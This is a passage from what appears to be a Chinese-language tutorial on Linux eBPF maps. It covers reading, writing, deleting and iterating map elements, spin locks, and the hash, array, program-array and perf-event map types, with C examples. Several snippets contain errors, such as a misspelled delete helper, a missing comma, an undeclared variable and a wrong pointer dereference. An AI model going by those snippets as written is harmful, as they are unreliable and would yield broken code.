因此，在我们的示例中，我们将参数<code>my_map</code>替换为全局文件描述符标识符<code>map_data[0].fd</code>。 在这种情况下，原始代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; </span><br><span class="line">key = <span class="number">1</span>, value = <span class="number">1234</span>;</span><br><span class="line">result = bpf_map_update_elem(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value, BPF_ANY); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Map updated with new element\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to update map with new value: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><h4 id="读取BPF映射中的元素"><a href="#读取BPF映射中的元素" class="headerlink" title="读取BPF映射中的元素"></a>读取BPF映射中的元素</h4><p>BPF还提供了两个不同的帮助器来根据你的代码运行的位置从映射中读取。 这两个助手都称为 <code>bpf_map_lookup_elem</code>。 和更新助手一样，它们的第一个参数不同， 内核方法采用对映射的引用，而用户空间助手采用映射的文件描述符标识符作为其第一个参数。两种方法都返回一个整数来表示操作是失败还是成功，就像更新助手一样。 这些帮助器中的第三个参数是指向代码中变量的指针，该变量将存储从映射中读取的值。 我们根据上一节中看到的代码提供两个示例。</p><p>第一个示例是BPF程序在内核上运行时读取插入到映射中的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; <span class="comment">// value is going to store the expected element's value </span></span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_lookup_elem(&amp;my_map, &amp;key, &amp;value); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>如果我们试图读取的键<code>bpf_map_lookup_elem</code>返回一个负数，它将<code>errno</code>变量中设置错误。 例如，如果我们在尝试读取并没有插入的值，内核将返回“未找到”错误<code>ENOENT</code>。</p><p>第二个示例与刚刚看到的示例类似，但这次我们从运行在用户空间的程序中读取映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result; <span class="comment">// value is going to store the expected element's value </span></span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_lookup_elem(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>这就是我们能够访问BPF映射中的信息所需的全部内容。 我们将在后面的章节中研究不同的工具包是如何简化这一点的，以使访问数据变得更加简单。 接下来我们来谈谈从映射中删除数据。</p><h4 id="删除BPF映射中的元素"><a href="#删除BPF映射中的元素" class="headerlink" title="删除BPF映射中的元素"></a>删除BPF映射中的元素</h4><p>我们可以在<code>map</code>上执行的第三个操作是删除元素。 与写入和读取元素一样，BPF为我们提供了两个不同的帮助器来删除元素，都称为<code>bpf_map_delete_element</code>。和前面的例子一样，当你在内核上运行的程序中使用这些助手时，它们使用对映射的直接引用，当你在运行用户空间的程序中使用它们时，它们使用映射的文件描述符标识。</p><p>第一个示例是BPF程序在内核上运行时删除了插入到映射中的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, result; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_delete_element(&amp;my_map, &amp;key); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Element deleted from the map\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to delete element from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><p>如果你尝试删除的元素不存在，内核将返回一个负数。 在这种情况下，它还会使用“未找到”错误<code>ENOENT</code>填充<code>errno</code>变量。</p><p>第二个示例是当BPF程序运行在用户空间时删除元素`</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, result; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line">result = bpf_map_delete_element(map_data[<span class="number">0</span>].fd, &amp;key); </span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Element deleted from the map\n"</span>); </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to delete element from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br></pre></td></tr></table></figure><h4 id="迭代BPF映射中的元素"><a href="#迭代BPF映射中的元素" class="headerlink" title="迭代BPF映射中的元素"></a>迭代BPF映射中的元素</h4><p>我们在本节中看到的最后一个操作可以帮助你在BPF程序中找到任意元素。 有时你不知道要查找的元素的确切键，或者只想查看<code>map</code>中的内容。BPF为此提供了一个名为<code>bpf_map_get_next_key</code>的指令。 此指令仅适用于在用户空间运行的程序。</p><p>这个帮助器为你提供了一种确定的方式来迭代<code>map</code>上的元素，但它不如大多数编程语言中的迭代器那么直观。 它需要三个参数。第一个是<code>map</code>的文件描述符标识符，第二个参数<code>key</code>是要查找的标识符，第三个参数<code>next_key</code>是映射中的下一个键。我们更喜欢将第一个参数称为<code>lookup_key</code>。 当你调用这个帮助器时，BPF会尝试在这个<code>map</code>中使用作为查找键传递的键来查找元素， 然后，它将<code>next_key</code>参数设置为映射中的相邻键。 所以如果你想知道<code>key 1</code>之后是哪个<code>key</code>，你需要设置1作为你的查找<code>key</code>，如果<code>map</code>有一个与这个<code>key</code>相邻的<code>key</code>，BPF会将它设置为<code>next_key</code>参数的值。</p><p>在查看<code>bpf_map_get_next_key</code>的工作原理之前，让我们在<code>map</code>中多添加一些元素：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> new_key, new_value, it; </span><br><span class="line"><span class="keyword">for</span>(it=<span class="number">2</span>;it&lt;<span class="number">6</span>;it++)&#123;</span><br><span class="line">  new_key = it;</span><br><span class="line">     new_value = <span class="number">1234</span> + it;</span><br><span class="line">     bpf_map_update_elem(map_data[<span class="number">0</span>].fd, &amp;new_key, &amp;new_value, BPF_NOEXIST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果要打印映射中的所有值，可以将<code>bpf_map_get_next_key</code>与映射中不存在的查找键一起使用。 这会强制BPF从<code>map</code>的开头开始：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> next_key, lookup_key; </span><br><span class="line">lookup_key = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(bpf_map_get_next_key(map_data[<span class="number">0</span>].fd, &amp;lookup_key, &amp;next_key) == <span class="number">0</span>) &#123; </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The next key in the map is: '%d'\n"</span>, next_key);</span><br><span class="line">lookup_key = next_key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '2'</span><br><span class="line">The next key in the map is: '3'</span><br><span class="line">The next key in the map is: '4'</span><br><span class="line">The next key in the map is: '5'</span><br></pre></td></tr></table></figure><p>你可以看到在循环结束时将下一个键分配给<code>lookup_key</code>， 这样，我们继续遍历<code>map</code>，直到终点。 当<code>bpf_map_get_next_key</code>到达<code>map</code>末尾时，返回值为负数，<code>errno</code>变量设置为<code>ENOENT</code>。 这将中止循环执行。</p><p><code>bpf_map_get_next_key</code>可以查找从<code>map</code>中任意点开始的键，如果你只想要另一个特定键的下一个键，则不需要从<code>map</code>的开头开始。</p><p>许多编程语言在遍历其元素之前会复制映射中的值。 如果你的程序中的某些其他代码试图改变<code>map</code>，这样可以防止一些未知行为。如果该代码从<code>map</code>中删除元素，这将会是一个危险的操作。BPF在使用<code>bpf_map_get_next_key</code>循环之前不会复制映射中的值。如果程序的另一部分在循环遍历值时从<code>map</code>中删除了一个元素，则<code>bpf_map_get_next_key</code>将重新开始进行遍历。 让我们看一个例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> next_key, lookup_key; </span><br><span class="line">lookup_key = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(bpf_map_get_next_key(map_data[<span class="number">0</span>].fd, &amp;lookup_key, &amp;next_key) == <span class="number">0</span>) &#123; </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The next key in the map is: '%d'\n"</span>, next_key);</span><br><span class="line"><span class="keyword">if</span> (next_key == <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Deleting key '2'\n"</span>);</span><br><span class="line">    bpf_map_delete_element(map_data[<span class="number">0</span>].fd &amp;next_key);</span><br><span class="line">&#125;</span><br><span class="line">    lookup_key = next_key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序的打印输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '2'</span><br><span class="line">Deleteing key '2'</span><br><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '3'</span><br><span class="line">The next key in the map is: '4'</span><br><span class="line">The next key in the map is: '5'</span><br></pre></td></tr></table></figure><h4 id="查找和删除元素"><a href="#查找和删除元素" class="headerlink" title="查找和删除元素"></a>查找和删除元素</h4><p>内核公开的另一个用于处理<code>map</code>的函数是<code>bpf_map_lookup_and_delete_elem</code>。此函数在<code>map</code>中搜索给定键并从中删除元素。同时，它把元素的值写入一个变量供程序使用。 当你使用队列和堆栈映射时，此函数会派上用场，而且，它不仅限于与这些类型的映射一起使用。 让我们看一个示例，说明如何将它与我们在之前示例中使用的<code>map</code>一起使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result, it; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(it=<span class="number">0</span>;it&lt;<span class="number">2</span>;it++)&#123;</span><br><span class="line">result = bpf_map_lookup_and_delete_element(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value); </span><br><span class="line">  <span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们尝试从<code>map</code>中获取相同的元素两次。在第一次遍历中，这段代码将打印<code>map</code>中元素的值。 但是，因为我们使用的是<code>bpf_map_lookup_and_delete_element</code>，所以第一次遍历也会从<code>map</code>中删除元素。 循环第二次尝试获取元素时，此代码将失败，并将使用“未找到”错误<code>ENOENT</code>填充<code>errno</code>变量。</p><h4 id="并发访问map元素"><a href="#并发访问map元素" class="headerlink" title="并发访问map元素"></a>并发访问map元素</h4><p>使用<code>BPF map</code>的挑战之一是许多程序可以同时访问相同的<code>map</code>。这可能会在我们的BPF程序中引入竞争条件，并使<code>map</code>中的资源访问变得不可预测。 为了防止竞争条件，BPF引入了BPF自旋锁的概念，它允许你在操作<code>map</code>元素时锁定对它的访问。 自旋锁仅适用于数组、散列和<code>cgroup</code>存储映射。</p><p>有两个BPF辅助函数可用于处理自旋锁：<code>bpf_spin_lock</code>用于锁定一个元素，<code>bpf_spin_unlock</code>可以解锁该元素。这些辅助函数使用信号量的结构来访问包含此信号量的元素。 当信号量被锁定时，其他程序无法访问元素的值，它们会一直等到信号量被解锁。 同时，BPF自旋锁引入了一个新的标志，用户空间程序可以使用它来改变锁的状态。该标志称为<code>BPF_F_LOCK</code>。使用自旋锁我们需要做的第一件事是创建我们想要锁定访问的元素，然后添加我们的信号量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> &#123;</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_spin_lock</span> <span class="title">semaphore</span>;</span> </span><br><span class="line">  <span class="keyword">int</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们会把这个结构存储在<code>BPF map</code>中，并在元素中使用信号量来防止对它的不当访问。 现在，我们可以声明将包含这些元素的<code>map</code>。 此<code>map</code>必须使用BPF类型格式(BTF)进行注释，以便验证器知道结构。 类型格式通过向二进制对象添加调试信息，使内核和其他工具对BPF数据结构有更丰富的理解。因为这段代码将在内核中运行，我们可以使用<code>libbpf</code>提供的内核宏来注释这个并发映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> concurrent_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH,</span><br><span class="line">.key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(struct concurrent_element), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">&#125;;</span><br><span class="line">BPF_ANNOTATE_KV_PAIR(concurrent_map, <span class="keyword">int</span>, struct concurrent_element);</span><br></pre></td></tr></table></figure><p>在BPF程序中，我们可以使用两个锁辅助函数来保护这些元素免受竞争条件的影响。即使信号量被锁定，我们的程序也保证能够安全地修改元素的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_program</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123; </span><br><span class="line">  <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> <span class="title">init_value</span> = &#123;</span>&#125;; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> *<span class="title">read_value</span>;</span></span><br><span class="line">  bpf_map_create_elem(&amp;concurrent_map, &amp;key, &amp;init_value, BPF_NOEXIST);</span><br><span class="line">  read_value = bpf_map_lookup_elem(&amp;concurrent_map, &amp;key);</span><br><span class="line">  bpf_spin_lock(&amp;read_value-&gt;semaphore);</span><br><span class="line">  read_value-&gt;count += <span class="number">100</span>;</span><br><span class="line">  bpf_spin_unlock(&amp;read_value-&gt;semaphore);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码通过初始化我们的并发映射来锁定对其值的访问。 然后，它从映射中获取该值并锁定其信号量，以便它可以保存计数值，从而防止数据竞争。 使用完该值后，它会释放锁，以便其他映射可以安全地访问该元素。</p><p>在用户空间，我们可以通过使用标志<code>BPF_F_LOCK</code>来保存对并发映射中元素的引用。你可以将此标志与<code>bpf_map_update_elem</code>和<code>bpf_map_lookup_elem_flags</code>辅助函数一起使用。 这个标志允许你更新元素而不用担心数据竞争。</p><p>自旋锁并不总是有用。 如果您只是在<code>map</code>中聚合值，则不需要使用自旋锁。 但是，如果你想确保并发程序在对它们执行多个操作时不会更改映射中的元素，从而保持原子性，那么自旋锁就很有用。</p><h3 id="BPF映射类型"><a href="#BPF映射类型" class="headerlink" title="BPF映射类型"></a>BPF映射类型</h3><h4 id="哈希表映射"><a href="#哈希表映射" class="headerlink" title="哈希表映射"></a>哈希表映射</h4><p>哈希表映射是第一个添加到BPF的通用映射。 它们使用<code>BPF_MAP_TYPE_HASH</code>类型定义。你可以使用任何大小的键和值， 内核会根据需要分配和释放它们。当你在哈希表映射上使用<code>bpf_map_update_elem</code>时，内核会自动替换元素。哈希表映射经过优化，查找速度非常快，它们对于保存经常读取的结构化数据很有用。让我们看一个使用它们来跟踪网络IP及其速率限制的示例程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> IPV4_FAMILY 1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_key</span> &#123;</span> </span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">        __u32 v4_addr;</span><br><span class="line">        __u8 v6_addr[<span class="number">16</span>];</span><br><span class="line">      &#125;;</span><br><span class="line">      __u8 family;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> counters </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(struct ip_key), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags =BPF_F_NO_PREALLOC </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这段代码中，我们声明了一个结构化的<code>key</code>，我们将使用它来保存有关IP地址的信息。 我们定义了我们的程序将用来跟踪速率限制的映射。你可以看到我们在此映射中使用IP地址作为键。 这些值将是我们的BPF程序从特定IP地址接收网络数据包的频率次数。</p><p>我们可以编写一个代码片段来更新内核中的这些计数器：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">update_counter</span><span class="params">(<span class="keyword">uint32_t</span> ipv4)</span> </span>&#123; </span><br><span class="line">  <span class="keyword">uint64_t</span> value;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_key</span> <span class="title">key</span> = &#123;</span>&#125;;</span><br><span class="line">key.v4_addr = ip4;</span><br><span class="line">key.family = IPV4_FAMILY;</span><br><span class="line">  bpf_map_lookup_elem(counters, &amp;key, &amp;value);</span><br><span class="line">  (*value) += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数获取从网络数据包中提取的IP地址，并使用我们声明的复合键执行映射查找。 在这种情况下，我们假设我们之前已经用零值初始化了计数器； 否则，<code>bpf_map_lookup_elem</code>调用将返回一个负数。</p><h4 id="数组映射"><a href="#数组映射" class="headerlink" title="数组映射"></a>数组映射</h4><p>数组映射是添加到内核的第二种类型的BPF映射。 它们使用<code>BPF_MAP_TYPE_ARRAY</code>类型定义。 当你初始化一个数组映射时，它的所有元素都预先分配在内存中并设置为零值。 因为这些映射是由一个元素切片支持的，所以键是数组中的索引，它们的大小必须正好是四个字节。使用数组映射的一个缺点是无法删除映射中的元素，并且无法使数组小于实际值。如果你尝试在数组映射上使用<code>map_delete_elem</code>，调用将失败，结果会收到错误<code>EINVAL</code>。</p><p>数组映射通常用于存储可以改变值的信息，但它的行为通常是固定的。 人们使用它来存储具有预定义分配规则的全局变量。因为你不能删除元素，所以可以假设特定位置的元素总是代表同一个元素。要记住的另一件事是<code>map_update_elem</code>不是原子的，就像你在哈希表映射中看到的那样。如果正在进行更新，同一程序可以同时从同一位置读取不同的值。 如果将计数器存储在数组映射中，则可以使用内核的内置函数<code>__sync_fetch_and_add</code>对映射的值执行原子操作。</p><h4 id="程序数组映射"><a href="#程序数组映射" class="headerlink" title="程序数组映射"></a>程序数组映射</h4><p>程序数组映射是第一个添加到内核的专用映射。它们使用<code>BPF_MAP_TYPE_PROG_ARRAY</code>类型定义。 你可以使用这种类型的映射来存储对BPF程序的文件描述符标识符的引用。 与辅助函数<code>bpf_tail_call</code>结合使用，此映射允许你在程序之间跳转，绕过单个BPF程序的最大指令限制并降低复杂性。</p><p>使用此专用映射时需要考虑一些事项。要记住的第一个方面是键和值的大小都必须是四个字节。要记住的第二个方面是，当你跳转到一个新程序时，新程序将重用相同的内存堆栈，因此程序不会消耗所有可用内存。最后，如果你尝试跳转到映射中不存在的程序，则尾调用将失败，当前程序将继续执行。让我们深入研究一个详细的示例，以了解如何更好地使用这种类型的映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> programs </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_PROG_ARRAY, </span><br><span class="line">  .key_size = <span class="number">4</span>,</span><br><span class="line">.value_size = <span class="number">4</span>,</span><br><span class="line">  .max_entries = <span class="number">1024</span>,</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>首先，我们需要声明我们的新程序映射（正如我们前面提到的，键和值的大小总是四个字节）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">intkey=<span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] = &#123;</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>), <span class="comment">// assign r0 = 0</span></span><br><span class="line">BPF_EXIT_INSN(), <span class="comment">// return r0 </span></span><br><span class="line">&#125;;</span><br><span class="line">prog_fd = bpf_prog_load(BPF_PROG_TYPE_KPROBE, prog, <span class="keyword">sizeof</span>(prog), <span class="string">"GPL"</span>); </span><br><span class="line">bpf_map_update_elem(&amp;programs, &amp;key, &amp;prog_fd, BPF_ANY);</span><br></pre></td></tr></table></figure><p>我们需要声明我们要跳转到的程序。 在这种情况下，我们正在编写一个BPF程序，其唯一目的是返回0。我们使用<code>bpf_prog_load</code>将其加载到内核中，然后将其文件描述符标识符添加到我们的程序映射中。</p><p>现在我们已经存储了该程序，我们可以编写另一个将跳转到它的BPF程序。 BPF程序只有在同类型的情况下才能跳转到其他程序，在这种情况下，我们将程序附加到<code>kprobe</code>跟踪</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"kprobe/seccomp_phase1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_kprobe_program</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> key=<span class="number">1</span>;</span><br><span class="line"><span class="comment">/* dispatch into next BPF program */</span> </span><br><span class="line">  bpf_tail_call(ctx, &amp;programs, &amp;key);</span><br><span class="line">  <span class="comment">/* fall through when the program descriptor is not in the map */</span></span><br><span class="line"><span class="keyword">char</span> fmt[] = <span class="string">"missing program in prog_array map\n"</span>; </span><br><span class="line">  bpf_trace_printk(fmt, <span class="keyword">sizeof</span>(fmt));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>bpf_tail_call</code>和<code>BPF_MAP_TYPE_PROG_ARRAY</code>最多可以链接 32 个嵌套调用。 这样可以防止无限循环和内存耗尽。</p><h4 id="Perf事件数组映射"><a href="#Perf事件数组映射" class="headerlink" title="Perf事件数组映射"></a>Perf事件数组映射</h4><p>这些类型的映射将<code>perf_events</code>数据存储在环形缓冲区中，该环形缓冲区在BPF程序和用户空间程序之间进行实时通信。 它们使用<code>BPF_MAP_TYPE_PERF_EVENT_ARRAY</code>类型定义。 旨在将内核跟踪工具发出的事件转发给用户空间程序以做进一步处理。用户空间程序充当监听器，等待来自内核的事件，因此你需要确保你写的代码在内核中的BPF程序初始化之前开始监听。</p><p>让我们看一个示例，说明如何跟踪计算机执行的所有程序。 在进入BPF程序代码之前，我们需要声明我们将从内核发送到用户空间的事件结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">u32 pid;</span><br><span class="line"><span class="keyword">char</span> program_name[<span class="number">16</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在，我们需要创建将事件发送到用户空间的映射：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> events </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_PERF_EVENT_ARRAY, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(u32), </span><br><span class="line">  .max_entries = <span class="number">2</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在我们声明了数据类型和映射后，我们可以创建捕获数据并将其发送到用户空间的BPF程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"kprobe/sys_exec"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_capture_exec</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">data_t</span> data;</span><br><span class="line"><span class="comment">// bpf_get_current_pid_tgid returns the current process identifier </span></span><br><span class="line">  data.pid = bpf_get_current_pid_tgid() &gt;&gt; <span class="number">32</span>;</span><br><span class="line">  <span class="comment">// bpf_get_current_comm loads the current executable name</span></span><br><span 